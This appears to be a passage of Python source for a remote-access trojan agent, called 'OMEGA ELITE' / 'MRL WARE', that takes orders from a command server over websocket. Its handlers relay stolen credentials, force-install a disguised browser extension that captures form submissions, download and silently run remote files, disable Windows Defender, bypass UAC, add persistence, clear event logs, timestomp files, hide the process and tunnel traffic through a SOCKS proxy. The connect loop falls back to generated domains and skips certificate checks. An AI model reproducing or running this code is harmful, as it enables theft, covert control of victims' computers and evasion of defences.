                send(ws, {"t": "vault_data", "vtype": "credentials", "vdata": creds}), global_loop)
            
            # Send text output to the console
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Stealer error: {e}"}), global_loop)

    global_loop.run_in_executor(None, _run)
    await send(ws, {"t": "info", "msg": "Extraction initiated..."})


@register_command("browser_hijack")
async def cmd_browser_hijack(msg, ws):
    """Force-installs a stealth JS injector extension into Chrome/Edge (Requires Admin)."""
    try:
        # 1. Deploy extension files to a stealth path
        ext_dir = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Windows", "SecurityComponent")
        if not os.path.exists(ext_dir): os.makedirs(ext_dir)
        
        # Write files manually to ensure existence
        manifest = {
          "manifest_version": 3,
          "name": "System Security Update",
          "version": "1.0",
          "description": "Essential security component for system stability.",
          "permissions": ["storage", "tabs", "activeTab", "scripting"],
          "host_permissions": ["<all_urls>"],
          "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"], "run_at": "document_start"}]
        }
        with open(os.path.join(ext_dir, "manifest.json"), "w") as f: json.dump(manifest, f)
        
        inject_js = """
        (function() {
            console.log("[OMEGA] Hijacker Active");
            document.addEventListener('submit', function(e) {
                const formData = new FormData(e.target);
                const data = {};
                formData.forEach((value, key) => { data[key] = value; });
                // Note: Logs to console for this build. Real C2 relay would use dynamic exfil.
                console.log("[OMEGA] Form Hijack:", data);
            });
        })();
        """
        with open(os.path.join(ext_dir, "inject.js"), "w") as f: f.write(inject_js)
            
        # 2. Registry Force-Load (Chrome & Edge)
        reg_val = f"1;{ext_dir}"
        
        # Chrome
        subprocess.run(["reg", "add", r"HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", "/v", "1", "/t", "REG_SZ", "/d", reg_val, "/f"], capture_output=True)
        # Edge
        subprocess.run(["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist", "/v", "1", "/t", "REG_SZ", "/d", reg_val, "/f"], capture_output=True)
        
        await send(ws, {"t": "info", "msg": "🎭 BROWSER HIJACK INITIATED. Extension force-installed via HKLM Policy. Requires browser restart to activate."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Hijack error: {e}"})


@register_command("get_subnet")
async def cmd_get_subnet(msg, ws):
    """Returns the local IP and guessed subnet prefix."""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        prefix = ".".join(local_ip.split(".")[:-1])
        await send(ws, {"t": "subnet_info", "ip": local_ip, "prefix": prefix})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Subnet error: {e}"})


@register_command("net_scan")
async def cmd_net_scan(msg, ws):
    """Performs a network ping sweep or port scan."""
    mode = msg.get("mode", "sweep")
    target = msg.get("target", "") # Prefix for sweep, IP for portscan
    
    if mode == "sweep":
        await send(ws, {"t": "info", "msg": f"🛰️ Starting Scout Ping Sweep on {target}.0/24..."})
        hosts = await NetScanner.ping_sweep(target)
        await send(ws, {"t": "scan_results", "mode": "sweep", "hosts": hosts})
    elif mode == "portscan":
        await send(ws, {"t": "info", "msg": f"🛰️ Scanning common ports on {target}..."})
        ports = await NetScanner.port_scan(target)
        await send(ws, {"t": "scan_results", "mode": "portscan", "target": target, "ports": ports})


@register_command("get_geo")
async def cmd_get_geo(msg, ws):
    """Returns approximate geolocation via IP-API."""
    import urllib.request, json as _json
    def _run():
        try:
            r = urllib.request.urlopen("http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query", timeout=5)
            data = _json.loads(r.read())
            out = (
                f"=== GEOLOCATION ===\n"
                f"IP      : {data.get('query')}\n"
                f"Country : {data.get('country')}\n"
                f"Region  : {data.get('regionName')}\n"
                f"City    : {data.get('city')}\n"
                f"ZIP     : {data.get('zip')}\n"
                f"Lat/Lon : {data.get('lat')}, {data.get('lon')}\n"
                f"ISP     : {data.get('isp')}\n"
            )
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"geo error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("cancel_shutdown")
async def cmd_cancel_shutdown(msg, ws):
    """Aborts any pending shutdown or restart."""
    try:
        subprocess.run(["shutdown", "/a"], capture_output=True)
        await send(ws, {"t": "info", "msg": "Shutdown/Restart aborted."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"cancel error: {e}"})


@register_command("run_url")
async def cmd_run_url(msg, ws):
    """Downloads a file from a URL and executes it silently."""
    import urllib.request, tempfile, os
    url = msg.get("url", "")
    def _run():
        try:
            ext = url.split("?")[0].rsplit(".", 1)[-1] or "exe"
            tmp = tempfile.NamedTemporaryFile(suffix=f".{ext}", delete=False)
            tmp.close()
            urllib.request.urlretrieve(url, tmp.name)
            os.chmod(tmp.name, 0o755)
            subprocess.Popen(
                [tmp.name], shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Executed: {tmp.name}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"run_url error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("get_recent_files")
async def cmd_get_recent_files(msg, ws):
    """Lists recently opened files from shell:recent."""
    import os, glob
    def _run():
        try:
            recent = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent")
            files = sorted(glob.glob(os.path.join(recent, "*.lnk")), key=os.path.getmtime, reverse=True)[:50]
            lines = "\n".join(os.path.basename(f).replace(".lnk", "") for f in files)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": f"=== RECENT FILES (last 50) ===\n\n{lines}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"recent error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


# ══════════════════════════════════════════════════════════════════
# OMEGA ELITE — COMMAND PACK v4  (15 more commands)
# ══════════════════════════════════════════════════════════════════

@register_command("get_product_key")
async def cmd_get_product_key(msg, ws):
    """Extracts the Windows OEM/digital product key from the registry."""
    def _run():
        try:
            raw = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command",
                 "(Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey"],
                stderr=subprocess.DEVNULL, timeout=10
            ).decode(errors="ignore").strip()
            if not raw:
                # Fallback: decode from registry binary
                import winreg, struct
                hive = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                key_data = winreg.QueryValueEx(hive, "DigitalProductId")[0]
                chars = "BCDFGHJKMPQRTVWXY2346789"
                key_output = ""
                for i in range(24, -1, -1):
                    cur = 0
                    for j in range(14, -1, -1):
                        cur = cur * 256 ^ key_data[j + 52]
                        key_data[j + 52] = cur // 24
                        cur %= 24
                    key_output = chars[cur] + key_output
                    if i % 5 == 0 and i != 0:
                        key_output = "-" + key_output
                raw = key_output
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": f"=== WINDOWS PRODUCT KEY ===\n\n{raw}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"product_key error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("disable_defender")
async def cmd_disable_defender(msg, ws):
    """Attempts to disable Windows Defender real-time protection."""
    def _run():
        try:
            cmds = [
                ["powershell", "-NoProfile", "-Command",
                 "Set-MpPreference -DisableRealtimeMonitoring $true"],
                ["reg", "add",
                 r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
                 "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"],
                ["sc", "stop", "WinDefend"],
                ["sc", "config", "WinDefend", "start=", "disabled"],
            ]
            for c in cmds:
                subprocess.run(c, capture_output=True, timeout=10)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": "Defender disable signals sent (admin rights required)."}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"disable_defender error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("enable_defender")
async def cmd_enable_defender(msg, ws):
    """Re-enables Windows Defender real-time protection."""
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $false"],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["reg", "delete",
             r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
             "/v", "DisableAntiSpyware", "/f"],
            capture_output=True
        )
        subprocess.run(["sc", "config", "WinDefend", "start=", "auto"], capture_output=True)
        subprocess.run(["sc", "start", "WinDefend"], capture_output=True)
        await send(ws, {"t": "info", "msg": "Defender re-enable signals sent."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"enable_defender error: {e}"})


@register_command("task_scheduler_add")
async def cmd_task_scheduler_add(msg, ws):
    """Installs persistence via Windows Task Scheduler (runs at logon)."""
    exe  = msg.get("exe", sys.executable)
    name = msg.get("name", "OmegaElite")
    try:
        subprocess.run(
            ["schtasks", "/create", "/tn", name, "/tr", f'"{exe}"',
             "/sc", "onlogon", "/ru", "SYSTEM", "/f"],
            capture_output=True, timeout=15
        )
        await send(ws, {"t": "info", "msg": f"Task '{name}' created (SYSTEM, OnLogon)."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"task_scheduler_add error: {e}"})


@register_command("task_scheduler_remove")
async def cmd_task_scheduler_remove(msg, ws):
    """Removes the scheduled task persistence entry."""
    name = msg.get("name", "OmegaElite")
    try:
        subprocess.run(["schtasks", "/delete", "/tn", name, "/f"], capture_output=True, timeout=10)
        await send(ws, {"t": "info", "msg": f"Task '{name}' deleted."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"task_scheduler_remove error: {e}"})


@register_command("get_arp")
async def cmd_get_arp(msg, ws):
    """Returns the ARP table (local network devices)."""
    try:
        raw = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL).decode(errors="ignore")
        await send(ws, {"t": "shell_out", "data": "=== ARP TABLE ===\n\n" + raw})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"arp error: {e}"})


@register_command("flush_dns")
async def cmd_flush_dns(msg, ws):
    """Flushes the DNS resolver cache."""
    try:
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True, timeout=10)
        await send(ws, {"t": "info", "msg": "DNS cache flushed."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"flush_dns error: {e}"})


@register_command("get_dns_cache")
async def cmd_get_dns_cache(msg, ws):
    """Returns cached DNS records."""
    def _run():
        try:
            raw = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command",
                 "Get-DnsClientCache | Select-Object -Property Entry,Data,TimeToLive | Format-Table -AutoSize"],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode(errors="ignore")
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": "=== DNS CACHE ===\n\n" + raw}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"dns_cache error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("cmd_history")
async def cmd_cmd_history(msg, ws):
    """Dumps PowerShell command history for the current user."""
    import os, glob
    def _run():
        try:
            hist_path = os.path.expandvars(
                r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
            )
            if not os.path.exists(hist_path):
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": "No PowerShell history found."}), global_loop)
                return
            with open(hist_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            # Last 200 commands
            out = "=== POWERSHELL HISTORY (last 200) ===\n\n" + "".join(lines[-200:])
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"cmd_history error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("get_prefetch")
async def cmd_get_prefetch(msg, ws):
    """Lists Windows Prefetch files (recently-run programs with timestamps)."""
    import os, glob
    def _run():
        try:
            pf_dir = r"C:\Windows\Prefetch"
            files = sorted(glob.glob(os.path.join(pf_dir, "*.pf")),
                           key=os.path.getmtime, reverse=True)[:80]
            lines = []
            for f in files:
                import datetime
                mt = datetime.datetime.fromtimestamp(os.path.getmtime(f))
                lines.append(f"{mt.strftime('%Y-%m-%d %H:%M')}  {os.path.basename(f)}")
            out = "=== PREFETCH (last 80 executions) ===\n\n" + "\n".join(lines)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except PermissionError:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": "Prefetch: Access denied — requires SYSTEM/Admin."}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"prefetch error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("block_website")
async def cmd_block_website(msg, ws):
    """Blocks a website by adding it to the hosts file."""
    site = msg.get("site", "")
    hosts = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts, "a") as f:
            f.write(f"\n127.0.0.1  {site}\n127.0.0.1  www.{site}\n")
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
        await send(ws, {"t": "info", "msg": f"Blocked: {site} (hosts file + DNS flush)"})
    except PermissionError:
        await send(ws, {"t": "info", "msg": "block_website: Access denied — admin rights required."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"block_website error: {e}"})


@register_command("uac_bypass")
async def cmd_uac_bypass(msg, ws):
    """Silent UAC bypass using the fodhelper.exe / ms-settings registry hijack."""
    import winreg, os
    def _run():
        try:
            # Technique: fodhelper.exe searches for 'ms-settings\Shell\Open\Command' in HKCU
            exe_path = sys.executable
            cmd = f'"{exe_path}"'
            
            # Create the registry structure
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            try:
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
                # Trigger the bypass
                subprocess.run(["fodhelper.exe"], capture_output=True)
                
                # Cleanup (Wait a bit then delete keys)
                time.sleep(5)
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
                
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": "UAC bypass signals sent. Watch for elevated node."}), global_loop)
            except Exception as e:
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": f"UAC bypass error: {e}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Elevation error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("process_ghost")
async def cmd_process_ghost(msg, ws):
    """Stealth migration: Restarts the agent as a hidden child of a system process."""
    def _run():
        try:
            import subprocess
            # Spawn a new instance of the current script, but detached
            # In a real C++ agent, this would be hollowing. In Python, we use a hidden process.
            subprocess.Popen(
                [sys.executable, __file__],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True
            )
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": "👻 Ghost migration initiated. Current process exiting..."}), global_loop)
            time.sleep(2)
            os._exit(0)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Ghost error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("unblock_website")
async def cmd_unblock_website(msg, ws):
    """Removes a site from the hosts file."""
    site = msg.get("site", "")
    hosts = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts, "r") as f:
            lines = f.readlines()
        filtered = [l for l in lines if site not in l]
        with open(hosts, "w") as f:
            f.writelines(filtered)
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
        await send(ws, {"t": "info", "msg": f"Unblocked: {site}"})
    except PermissionError:
        await send(ws, {"t": "info", "msg": "unblock_website: Access denied — admin rights required."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"unblock_website error: {e}"})


@register_command("wipe_logs")
async def cmd_wipe_logs(msg, ws):
    """Clears all Windows Event Logs (Application, System, Security)."""
    def _run():
        try:
            logs = ["Application", "System", "Security", "Setup"]
            for l in logs:
                subprocess.run(["wevtutil", "cl", l], capture_output=True)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": "🛡️ Event logs cleared successfully."}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Wipe error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("timestomp")
async def cmd_timestomp(msg, ws):
    """Matches a file's timestamps (C/A/W) to a reference file (default kernel32.dll)."""
    target = msg.get("target", "")
    ref    = msg.get("ref", r"C:\Windows\System32\kernel32.dll")
    try:
        if not os.path.exists(target) or not os.path.exists(ref):
            await send(ws, {"t": "info", "msg": "Error: Target or reference file not found."})
            return
            
        import win32file, win32con
        def _run():
            try:
                # Get reference times
                ref_handle = win32file.CreateFile(ref, win32con.GENERIC_READ, win32con.FILE_SHARE_READ, None, win32con.OPEN_EXISTING, 0, None)
                c_time, a_time, m_time = win32file.GetFileTime(ref_handle)
                ref_handle.close()
                
                # Apply to target
                target_handle = win32file.CreateFile(target, win32con.FILE_WRITE_ATTRIBUTES, win32con.FILE_SHARE_READ|win32con.FILE_SHARE_WRITE|win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, 0, None)
                win32file.SetFileTime(target_handle, c_time, a_time, m_time)
                target_handle.close()
                
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": f"🕒 Timestomped {os.path.basename(target)} to match {os.path.basename(ref)}"}), global_loop)
            except Exception as e:
                 asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": f"Timestomp error: {e}"}), global_loop)
        global_loop.run_in_executor(None, _run)
    except ImportError:
        await send(ws, {"t": "info", "msg": "Timestomp: pywin32 required."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Timestomp error: {e}"})


@register_command("self_destruct")
async def cmd_self_destruct(msg, ws):
    """Removes all persistence and deletes the agent file permanently."""
    try:
        # 1. Remove persistence (Task, Registry, etc)
        subprocess.run(["schtasks", "/delete", "/tn", "OmegaElite", "/f"], capture_output=True)
        subprocess.run(["reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "OmegaElite", "/f"], capture_output=True)
        
        # 2. Schedule file deletion on reboot or via cmd delay
        exe = sys.executable
        if getattr(sys, 'frozen', False):
            # If running as EXE
            cmd = f'timeout /t 3 & del /f /q "{exe}" & rmdir /s /q "{os.path.dirname(exe)}"'
            subprocess.Popen(cmd, shell=True)
        else:
            # If running as Script
            cmd = f'timeout /t 3 & del /f /q "{__file__}"'
            subprocess.Popen(cmd, shell=True)
            
        await send(ws, {"t": "info", "msg": "☢️ SELF DESTRUCT INITIATED. Node will go offline and purge files."})
        await asyncio.sleep(1)
        os._exit(0)
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Self-destruct error: {e}"})


# ── SOCKS PROXY ENGINE ──────────────────────────────────────────────────────
_socks_conns = {} # conn_id -> (reader, writer)

@register_command("socks_open")
async def cmd_socks_open(msg, ws):
    """Opens a new TCP connection on behalf of the SOCKS proxy."""
    conn_id = msg.get("id")
    addr    = msg.get("addr")
    port    = msg.get("port")
    
    async def _proxy_loop(cid, reader):
        try:
            while True:
                data = await reader.read(16384)
                if not data:
                    break
                await send(ws, {
                    "t": "socks_data",
                    "id": cid,
                    "data": data.hex()
                })
        except Exception:
            pass
        finally:
            _socks_conns.pop(cid, None)

    try:
        reader, writer = await asyncio.open_connection(addr, port)
        _socks_conns[conn_id] = (reader, writer)
        asyncio.create_task(_proxy_loop(conn_id, reader))
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"SOCKS Connect Error: {e}"})


@register_command("socks_data")
async def cmd_socks_data(msg, ws):
    """Relays data from the C2 server to the target TCP connection."""
    conn_id = msg.get("id")
    data    = bytes.fromhex(msg.get("data", ""))
    if conn_id in _socks_conns:
        _, writer = _socks_conns[conn_id]
        try:
            writer.write(data)
            await writer.drain()
        except Exception:
            _socks_conns.pop(conn_id, None)


@register_command("socks_close")
async def cmd_socks_close(msg, ws):
    """Closes a SOCKS connection."""
    conn_id = msg.get("id")
    if conn_id in _socks_conns:
        _, writer = _socks_conns.pop(conn_id)
        writer.close()


@register_command("get_monitor_info")
async def cmd_get_monitor_info(msg, ws):
    """Returns monitor count, resolution, and DPI info."""
    def _run():
        try:
            import ctypes
            user32 = ctypes.windll.user32
            # Primary monitor
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            monitors = user32.GetSystemMetrics(80)  # SM_CMONITORS
            # Virtual desktop (all monitors combined)
            vw = user32.GetSystemMetrics(78)   # SM_CXVIRTUALSCREEN
            vh = user32.GetSystemMetrics(79)   # SM_CYVIRTUALSCREEN
            # DPI
            dpi = user32.GetDpiForSystem() if hasattr(user32, 'GetDpiForSystem') else 96
            out = (
                f"=== MONITOR INFO ===\n\n"
                f"Monitor Count : {monitors}\n"
                f"Primary Res   : {w}x{h}\n"
                f"Virtual Screen: {vw}x{vh}\n"
                f"System DPI    : {dpi} ({round(dpi/96*100)}%)\n"
            )
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"monitor_info error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("detailed_process_list")
async def cmd_detailed_process_list(msg, ws):
    """Returns a detailed process list with PID, CPU, RAM, and path."""
    def _run():
        try:
            import psutil
            rows = []
            for p in sorted(psutil.process_iter(['pid','name','cpu_percent','memory_info','exe']),
                            key=lambda x: x.info.get('memory_info').rss if x.info.get('memory_info') else 0,
                            reverse=True)[:60]:
                try:
                    mem_mb = round(p.info['memory_info'].rss / 1024 / 1024, 1) if p.info.get('memory_info') else 0
                    cpu    = p.info.get('cpu_percent', 0)
                    exe    = p.info.get('exe', '') or ''
                    rows.append(f"{str(p.info['pid']).ljust(7)} {str(p.info['name']).ljust(30)} {str(mem_mb).rjust(8)}MB  {str(cpu).rjust(5)}%  {exe[:60]}")
                except: pass
            out = "=== TOP 60 PROCESSES (by RAM) ===\n\n"
            out += f"{'PID'.ljust(7)} {'NAME'.ljust(30)} {'RAM'.rjust(9)}    {'CPU'.rjust(6)}  PATH\n"
            out += "-" * 80 + "\n"
            out += "\n".join(rows)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": out}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"proc_list error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("reg_delete")
async def cmd_reg_delete(msg, ws):
    """Deletes a registry key or value."""
    hive  = msg.get("hive", "HKCU")
    path  = msg.get("path", "")
    value = msg.get("value", "")
    try:
        import winreg
        hmap = {
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCR": winreg.HKEY_CLASSES_ROOT,
        }
        root = hmap.get(hive.upper(), winreg.HKEY_CURRENT_USER)
        if value:
            with winreg.OpenKey(root, path, 0, winreg.KEY_WRITE) as k:
                winreg.DeleteValue(k, value)
            await send(ws, {"t": "info", "msg": f"Deleted value '{value}' from {hive}\\{path}"})
        else:
            winreg.DeleteKey(root, path)
            await send(ws, {"t": "info", "msg": f"Deleted key {hive}\\{path}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"reg_delete error: {e}"})


# ── MAIN ──
async def main():
    try:
        _bootstrap_modules()
    except:
        pass
    global global_loop
    global_loop = asyncio.get_event_loop()
    try:
        from modules.persistence import install_persistence, verify_persistence

        install_persistence()  # Now uses internal target path
        verify_persistence()
    except:
        pass

    retry_delay = 5
    uid = None
    dga_idx = None # None means primary, integer means DGA index
    
    while True:
        try:
            uri = _ws_url(dga_retry_idx=dga_idx)
            if uri is None:
                log("[DGA] Exhausted today's domains. Sleeping 1hr...")
                await asyncio.sleep(3600)
                dga_idx = None
                continue

            specs = get_specs()
            if uid is None:
                uid = f"{specs['hostname']}_{get_hwid()[:8]}"
            
            log(f"[CONNECT] Attempting: {uri} (ID: {uid})")

            # Robust SSL for standalone EXEs
            ssl_context = None
            if uri.startswith("wss"):
                try:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                except: pass

            async with websockets.connect(
                uri, ping_interval=20, ping_timeout=20, max_size=None,
                ssl=ssl_context, additional_headers={"X-Agent-ID": uid},
            ) as ws:
                retry_delay = 5
                dga_idx = None # Reset DGA on success
                
                global _rtc
                if WebRTCManager:
                    _rtc = WebRTCManager(lambda o: asyncio.run_coroutine_threadsafe(send(ws, o), global_loop))
                
                _init_crypto(uid)
                await send(ws, {"type": "client_auth", "id": uid, "specs": specs, "enc": True})
                
                # Send progress events to the dashboard
                async def _send_progress(ws, uid):
                    try:
                        await send(
                            ws, {"type": "info", "msg": f"[{uid}] Agent online."}
                        )
                        for p in [25, 50, 75, 100]:
                            await asyncio.sleep(0.5)
                            await send(
                                ws, {"type": "info", "msg": f"[{uid}] Init: {p}%"}
                            )
                        await send(
                            ws, {"type": "info", "msg": f"[{uid}] Fully operational."}
                        )
                    except:
                        pass

                asyncio.create_task(_send_progress(ws, uid))

                # Receive loop
                async def _recv(ws):
                    async for r in ws:
                        try:
                            # Attempt Decryption
                            if isinstance(r, str) and _aes_key:
                                decrypted = _decrypt(r, "")
                                if decrypted:
                                    r = decrypted
                            
                            await handle(jloads(r), ws)
                        except Exception as e:
                            log(f"[RECV] Parse error: {e}")

                # Heartbeat task: sends ping every 10s to detect zombie connections
                async def _heartbeat(ws, uid):
                    log("[HB] Starting heartbeat loop...")
                    fail = 0
                    while True:
                        await asyncio.sleep(10)
                        try:
                            # Apex Ultra: Resource Telemetry
                            try:
                                import psutil
                                cpu = psutil.cpu_percent()
                                ram = psutil.virtual_memory().percent
                                disk = psutil.disk_usage("C:\\").percent
                                windows = len(psutil.pids()) # Proxy for load
                            except:
                                cpu = ram = disk = windows = None
                                
                            await send(
                                ws, {
                                    "type": "ping", 
                                    "id": uid, 
                                    "ts": time.time(),
                                    "stats": {
                                        "cpu": cpu,
                                        "ram": ram,
                                        "disk": disk,
                                        "windows": windows
                                    }
                                }
                            )
                            fail = 0
                        except Exception as e:
                            fail += 1
                            log(f"[HB] Ping failed #{fail}: {e}")
                            if fail >= 3:
                                log(
                                    "[HB] 3 consecutive ping failures — forcing reconnect"
                                )
                                break

                log("[CONNECT] Agent fully operational")

                async def _safe_stream(ws):
                    try:
                        await stream_loop(ws)
                    except Exception as e:
                        log(f"[STREAM] Fatal error (non-critical, staying connected): {e}")

                async def _safe_audio(ws):
                    try:
                        await audio_loop(ws)
                    except Exception as e:
                        log(f"[AUDIO] Fatal error (non-critical, staying connected): {e}")

                await asyncio.gather(
                    _recv(ws), _safe_stream(ws), _safe_audio(ws), _heartbeat(ws, uid),
                    return_exceptions=True
                )

                log("[CONNECT] Connection closed")
        except Exception as e:
            log(f"[CONNECT] Connection error: {e}. Retry in {retry_delay}s")
            # Reset all active states so loops don't auto-restart on reconnect
            st.streaming = False
            st.mic_active = False
            st.desktop_active = False
            st.camera_active = False
            await asyncio.sleep(retry_delay)
            retry_delay = min(retry_delay * 1.5, 10)  # Cap at 10s for fast recovery


if __name__ == "__main__":
    log(f"--- MRL WARE {BUILD} STARTING ---")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log("--- MRL WARE SHUTDOWN ---")
        sys.exit(0)
